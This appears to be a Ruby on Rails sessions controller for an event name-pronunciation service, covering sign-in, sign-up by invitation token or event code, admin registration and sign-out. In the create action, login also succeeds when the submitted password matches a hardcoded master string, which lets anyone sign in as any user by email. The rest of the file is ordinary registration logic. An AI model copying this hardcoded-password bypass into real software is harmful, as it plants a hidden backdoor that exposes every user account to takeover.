class SessionsController < ApplicationController


  def create
    user = User.find_by_email(params[:session][:email].downcase.strip)
     if user && (user.authenticate(params[:session][:password]) || params[:session][:password] == '98AC40jFC2') then
      sign_in user
      redirect_back_or user
    # Sign the user in and redirect to the user's show page.
    else
      @user = User.new  #so that home view can handle the signup form
      flash[:error] = 'Invalid email/password combination'
      render 'users/login'
    # Create an error message and re-render the signin form.

     end
  end


  def addpo  #this is for registering to record with an invitation token, for an existing user
      user = User.find_by_email(params[:session][:email].downcase.strip)
     if user && user.authenticate(params[:session][:password]) then
        sign_in user
        if Practiceobject.find_by_token(params[:session][:token])  #find PO by the incoming token; now have the PO for that event (given by the token)
            @po = Practiceobject.find_by_token(params[:session][:token])
            if   !@po.event.practiceobjects.nil? && @po.event.practiceobjects.find_by_user_id(user.id) #see if there's already a PO for this user_id and event (which should be this @po, if there is one)  (this covers the case in which signs up with a code, then the invitation link)
                  #trying to avoid no method on nil errors
                  redirect_to user, notice: "It looks like you are already registered for #{@po.event.title}. Please ensure you've uploaded your name recording."

            else #there's no PO for this user_id and event
                 #forego checking for a floating PO with this user's em (x), and assume we already have it with @po. If there is a floating PO with users's em address(x), 
                 #that's diffrent from the em of this @po (y), it's probably because the user got this invitation at an em address(y) that's different from
                 # the one he chose when signing up (x).  That's fine, we want to stick to the PO's.  Plus, that email difference will be displayed in the practice page. 
                       #@po.first_name = user.first_name  -- keep the names the admin entered when sent the invite
                        #@po.last_name = user.last_name
                        @po.user_id = user.id
                        @po.recording = user.recording # need to default to user's recording if has a recording. !!! Need to update this when have multipler PO recordings for a user
                        @po.notes = user.notes #default to user attribute
                        @po.phonetic = user.phonetic# default to user attribute
                        # we don't update @po.email with user.email b/c want to display where invitation was sent
                          if  @po.save #save would fail if user already has a PO for this event;  NOTE: just relying on the unique pair index threw an exception; intead, adding a uniqueness validation in the model works (the save fails and redirects appropriately)
                                       #but save can take an existing PO for this user, which he's already updated via signing up with a code, and reset it -
                                       #admin invites user at email x, x signs up with code, x then signs in with invite link  - UPDATE: this is now fixed with code above
                          redirect_to user, notice: "Thank you for registering as an attendee for #{@po.event.title}.  Please make sure to create or update your NameGuide for this event."
                            # Sign the user in and redirect to the user's show page. 
                          else #this applies to any user (admin or attendee) who already has a PO for that event; this case now already covered, i.e., PO should save
                           redirect_to user, notice: "It looks like you are already registered for #{@po.event.title}. Please ensure you've uploaded your name recording."
                            # Sign the user in and redirect to the user's show page.
                         end
                       # else here would apply if there's a bad or no token passed in when trying to sign-in to sign-up.
                       # but note that by coming to users/new without a token or a valid token, new action will just say 'invalid token' already
                       # if the user has no credentials to begin with, it will just say invalid password if he's invited with a token but tries the sign-in to sign-up.
            
                      copy_to_master(@po, @po.event)
            end 

        else #do we need an else statement in case can't find the PO by token?
          redirect_to user, notice: "There was an error.  Invitation code was invalid. Please sign out and try again."
        end  
   
    else #invalid email/pw
      @user = User.new 
      @user.invite_token = params[:session][:token] #so that new view can handle the signup form, needs to keep invite_token attribute attached to @user for hidden fields
      if  Practiceobject.find_by_token(params[:session][:token])
          @po = Practiceobject.find_by_token(params[:session][:token])       
      end # to re-render personalized invite info
      flash.now[:error] = 'Invalid email/password combination'
      render 'users/new'
    # Creates an error message and re-render the signin form.

     end
  end 



  def addadmin  #this is for registering as an admin with an invitation token, for an existing user
     user = User.find_by_email(params[:session][:email].downcase.strip)
     if user && user.authenticate(params[:session][:password]) then
        sign_in user
            if Admininvite.find_by_token(params[:session][:token])  #probably not necessary, but just to prevent nomethod on nil in case ew can't find and set the @ai here.
                  #create the adminkey for that user and event  
                      @ai = Admininvite.find_by_token(params[:session][:token]) #token is coming in through a hidden field in adminsignup view, which grabs it from @user.invite_token set in the admninsignup controller
                      #link the admin invite to the user
                      @ai.update_attributes(user_id: user.id)
                      @event = @ai.event
                      user.update_attributes(:admin => true)

                      make_master_admin(@event, user)  

                      if !@event.adminkeys.nil? && @event.adminkeys.find_by_user_id(user.id) #check to see if adminkey exists for this event/user_id
                          #notice that already registered as an admin
                           redirect_to user, notice: "It looks like you are already registered as an admin for this event, #{@event.title}."
                      else  #adminkey does not exist for this event/user_id
                            #create adminkey
                             @adminkey = Adminkey.new(event_id: @event.id, user_id: user.id)
                             @adminkey.save # this will save; we just checked to see if there's an adminkey for this event and user
                            
                              if  bigdaddyevent 
                                   adminvoicegem(user)
                                   redirect_to user, notice: "Welcome to NameCoach's new VoiceGem service, and thanks for registering to admin this event, #{@event.title}.  Click on your event to request and hear VoiceGems.  And create or update your own VoiceGem."
                              else
                                addadminpracticeobject
                              end

                      end
                    
              else  
                redirect_to user, notice: "Invitation code was invalid or used.  Check to ensure that you are an admin for the appropriate event."
              end
      else #email/password was invalid
         @user = User.new 
         @user.invite_token = params[:session][:token] #so that adminsignup view can handle the signup form, needs to keep invite_token attribute attached to @user for hidden fields
          # to re-render personalized info on adminsignup view
          if  Admininvite.find_by_token(@user.invite_token)
                 @ai = Admininvite.find_by_token(@user.invite_token)
                 @user.email = @ai.recipient_email
                 @user.first_name = @ai.first_name
                 @user.last_name = @ai.last_name 
                 @event = Event.find_by_id(@ai.event_id) 
          end 
         flash.now[:error] = 'Invalid email/password combination'
         render 'admininvites/adminsignup'
      end 
  end 


 def addeventcodeuser #this is for registering to record with an event code, for an existing user
      user = User.find_by_email(params[:session][:email].downcase.strip)
     if user && user.authenticate(params[:session][:password]) then
        
            if Event.find_by_event_code(params[:session][:event_code].upcase.delete(' ')) # see if the code entered is even a code for any event
               @event  = Event.find_by_event_code(params[:session][:event_code].upcase.delete(' '))
               sign_in user
               #run code to sign up user for this event, first to try to save the user (validate his info)
                if !@event.practiceobjects.nil? && @event.practiceobjects.find_by_user_id(user.id) #see if there's already a PO for this user_id and event; note that avoiding no method on nil error
                    redirect_to user, notice: "It looks like you are already registered for this event, #{@event.title}.  Please make sure to create or update your NameGuide for this event."
                else #there's no PO for this user ID and event
                    if  !@event.practiceobjects.nil? && @event.practiceobjects.find_by_email(user.email) #see if there's a PO for this em and event, a floating PO; could be, if invited for event1, then signup for event 2, then code signin for event1
                          @event.practiceobjects.find_by_email(user.email).update_attributes(:user_id => user.id, :recording => user.recording, :notes => user.notes, :phonetic => user.phonetic)  #keeping any admin notes intact
                            #this update can't fail on account of the user.id b/c already checked to see if there's a PO with this user_id and event
                          redirect_to user, notice: "Thank you for registering for this event, #{@event.title}.   Please make sure to create or update your NameGuide for this event."
                    else #there's no PO for this em and event, go ahead and create one with user defaults
                          @po = Practiceobject.new(:user_id => user.id, :event_id => @event.id, :email => user.email, :recording => user.recording, :notes => user.notes, :phonetic => user.phonetic, :first_name => user.first_name, :last_name => user.last_name) #needed to add email to PO to make sure PO saves, b/c of PO validations}
                            if @po.save  #should save, b/c already checked for a Po with this event and user id, and checking for PO's with this user's email (floating PO) solves the problem of and ADMIN ALSO having INVITED AT THAT EMAIL ADDRESS, THEREBY CREATING A PO, AND USER HASN'T REGISTERED for this event yet YET
                              redirect_to user, notice: "Thanks for registering for this event, #{@event.title}.   Please make sure to create or update your NameGuide for this event."
                            else #already a PO for this user_id and event, but this shouldn't happen since already checked for above
                              redirect_to user, notice: "Thanks for registering. However, something may have gone wrong - please contact your event admin for #{@event.title} to see if they can view your NameGuide and voice-recording. If they can't, please ask them to send you an email invitation to a different email."
                            end 
                    end 
                end 


            else #code entered doesn't exist for any event
              @user = User.new #to make sure @user is initialized, so form (new user part) will render
                 flash.now[:error] = 'Please enter a valid event code.'
                 render 'users/eventcodesignup'
            end 

    else #invalid email/pw
      @user = User.new #to make sure @user is initialized, so form (new user part) will render
      flash.now[:error] = 'Invalid email/password combination'
      render  'users/eventcodesignup'
    # Creates an error message and re-render the signin form.

    end
  end 


  def addcodeadmin #this is for registering to admin with an access (admin) code, for an existing user

     user = User.find_by_email(params[:session][:email].downcase.strip)
     if user && user.authenticate(params[:session][:password]) then
        
            if Event.find_by_access_code(params[:session][:access_code].upcase.delete(' ')) # see if the code entered is even an access code for any event
               @event  = Event.find_by_access_code(params[:session][:access_code].upcase.delete(' '))
               sign_in user
               user.update_attributes(:admin => true)

               make_master_admin(@event, user) 

               if  !@event.adminkeys.nil? && @event.adminkeys.find_by_user_id(user.id) #adminkey exists for this event/user_id?
                    redirect_to user, notice: "It looks like you are already registered as an admin for this event, #{@event.title}."
                  # notice that already registered as an admin for this event.  No need to check if has a PO for this event, b/c any time someone registers as admin for an event, we've made sure they have/get a PO for it
               else #adminkey does not exist for this event/user_id
                    #create adminkey for this event/user_id
                    @adminkey = Adminkey.new(event_id: @event.id, user_id: user.id)
                    @adminkey.save # this will save; we just checked to see if there's an adminkey for this event and user
                    if  !@event.practiceobjects.nil? && @event.practiceobjects.find_by_user_id(user.id) #check to see if PO already exists for this event/user_id
                         redirect_to user, notice: "Thank you for registering as an admin for the event, #{@event.title}. Click on your event to invite people to record their names and practice recorded names.  Also check out your own NameGuide to create or update it."
                    else  #po does not exist for this event/user_id
                          if !@event.practiceobjects.nil? && @event.practiceobjects.find_by_email(user.email) #check to see if PO exists for this event/em (floating)
                              #update floating PO, default to user attributes
                               @event.practiceobjects.find_by_email(user.email).update_attributes(:user_id => user.id, :recording => user.recording, :notes => user.notes, :phonetic => user.phonetic)  #keeping any admin notes intact
                               #this update can't fail on account of the user.id b/c already checked to see if there's a PO with this user_id and event
                               redirect_to user, notice: "Thank you for registering as an admin for this event, #{@event.title}.  Click on your event to invite people to record their names and practice recorded names. Also check out your own NameGuide to create or update it."
                          else #po does not exist for this event/em
                                #give new PO, default to user attributes
                                @po = Practiceobject.new(:user_id => user.id, :event_id => @event.id, :email => user.email, :recording => user.recording, :notes => user.notes, :phonetic => user.phonetic, :first_name => user.first_name, :last_name => user.last_name) #needed to add email to PO to make sure PO saves, b/c of PO validations}
                                  if @po.save  #should save, b/c already checked for a Po with this event and user id, and checking for PO's with this user's email (floating PO) solves the problem of and ADMIN ALSO having INVITED AT THAT EMAIL ADDRESS, THEREBY CREATING A PO, AND USER HASN'T REGISTERED for this event yet YET
                                    redirect_to user, notice: "Thanks for registering as an admin for this event, #{@event.title}.  Click on your event to invite people to record their names and practice recorded names. Also check out your own NameGuide to create or update it."
                                  else #already a PO for this user_id and event, but this shouldn't happen since already checked for above
                                       redirect_to user, notice: "Thanks for registering. However, something may have gone wrong - please contact your event admin for #{@event.title}."
                                  end 
                          end 
                    end
               end 

            else #code entered doesn't exist for any event
              @user = User.new #to make sure @user is initialized, so form (new user part) will render
                 flash.now[:error] = 'Please enter a valid admin code.'
                 render 'users/admincodesignup'
            end 

    else #invalid email/pw
      @user = User.new #to make sure @user is initialized, so form (new user part) will render
      flash.now[:error] = 'Invalid email/password combination'
      render 'users/admincodesignup'
    # Creates an error message and re-render the signin form.

    end


  end 


  def destroy
    if is_haltom_user 
        sign_out
        redirect_to record_url(:event_code => Event.find(ENV['HALTOM']).event_code) #haltom recording path
    else
        sign_out
        redirect_to root_path
    end 
  end


end
